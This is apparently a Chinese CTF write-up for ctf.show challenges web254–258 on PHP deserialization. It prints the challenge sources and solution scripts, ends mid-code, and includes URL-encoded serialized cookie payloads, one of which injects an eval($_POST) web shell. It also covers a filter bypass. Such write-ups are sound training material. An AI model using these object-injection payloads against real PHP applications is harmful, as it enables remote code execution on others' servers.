        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化</title>
      <link href="/ctfshow/ctf.show/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/ctfshow/ctf.show/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h1><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__sleep() //执行serialize()时，先会调用这个函数</span><br><span class="line">__wakeup() //将在反序列化之后立即调用（当反序列化时变量个数与实际不符时绕过）</span><br><span class="line">__construct() //当对象被创建时，会触发进行初始化</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__toString()： //当一个对象被当作字符串使用时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //获得一个类的成员变量时调用,用于从不可访问的属性读取数据（不可访问的属性包括：1.属性是私有型。2.类中不存在的成员变量）</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发</span><br><span class="line">__invoke() //当尝试以调用函数的方式调用一个对象时</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这题连序列化,反序列化函数都没有,直接get传参</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271212027.png" alt="image-20220327121200946"></p><h1 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;<span class="comment">#如果设置了username和password</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);<span class="comment">#反序列化cookie的user</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;<span class="comment">#传入username和password去和本身的username与password比较</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;<span class="comment">#检查是不是vip</span></span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();<span class="comment">#给flag</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301428846.png" alt="image-20220330142836747"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301428397.png" alt="image-20220330142842331"></p><h1 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;<span class="comment">#如果username不等于passwd</span></span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;wanan&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">#O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%22wanan%22%3Bs%3A8%3A%22password%22%3Bs%3A3%3A%22123%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span></span><br></pre></td></tr></table></figure><p>get传入的username和password要等于反序列化对象的username和passwd哦</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?username=wanan&amp;password=123</span><br><span class="line">Cookie : user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%22wanan%22%3Bs%3A8%3A%22password%22%3Bs%3A3%3A%22123%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405181046970.png" alt="image-20220405181046970"></p><h1 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-12-02 20:33:07</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="comment">#当对象创建时触发</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;<span class="comment">#当对象销毁时触发</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();#<span class="title">this</span>的<span class="title">class</span>属性去调用<span class="title">getinfo</span>()函数,那么就需要<span class="title">class</span>是一个<span class="title">backDoor</span>对象</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);<span class="comment">#最终终点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = <span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&#x27;phpinfo();eval($_POST[zf]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$final</span> = <span class="keyword">new</span> <span class="title class_">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$final</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">#O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A27%3A%22phpinfo%28%29%3Beval%28%24_POST%5Bzf%5D%29%3B%22%3B%7D%7D</span></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405181331408.png" alt="image-20220405181331408"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405181343542.png" alt="image-20220405181343542"></p><h2 id="修改属性的方式"><a href="#修改属性的方式" class="headerlink" title="修改属性的方式"></a>修改属性的方式</h2><p>这里总共有三种修改属性的方式</p><h3 id="直接写"><a href="#直接写" class="headerlink" title="直接写"></a>直接写</h3><p>优点是方便,缺点是只能赋值字符串</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wanan</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$str</span> = <span class="string">&quot;eval&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$int</span> = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="外部赋值"><a href="#外部赋值" class="headerlink" title="外部赋值"></a>外部赋值</h3><p>优点是可以赋值任意类型的值,缺点是只能操作public属性</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DEMO1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">DEMO1</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;func = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line"><span class="variable">$o</span>-&gt;arg = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$o</span>)));</span><br></pre></td></tr></table></figure><p>对于php7.1+的版本,反序列化对属性类型不敏感,题目虽然类下的属性可能不是public,但是我们可以本地改成public,然后生成public的序列化字符串.由于7.1+版本的容错机制,尽管属性类型错误,php也可以识别,反序列化成功.这样也可以绕过\0字符的过滤</p><h3 id="构造方法赋值"><a href="#构造方法赋值" class="headerlink" title="构造方法赋值"></a>构造方法赋值</h3><p>优点是解决上面缺点,缺点是麻烦</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DEMO1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">DEMO1</span>();</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$o</span>)));</span><br></pre></td></tr></table></figure><h1 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h1><h2 id="反序列化绕过-匹配"><a href="#反序列化绕过-匹配" class="headerlink" title="反序列化绕过+匹配"></a>反序列化绕过+匹配</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-12-02 21:38:56</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span 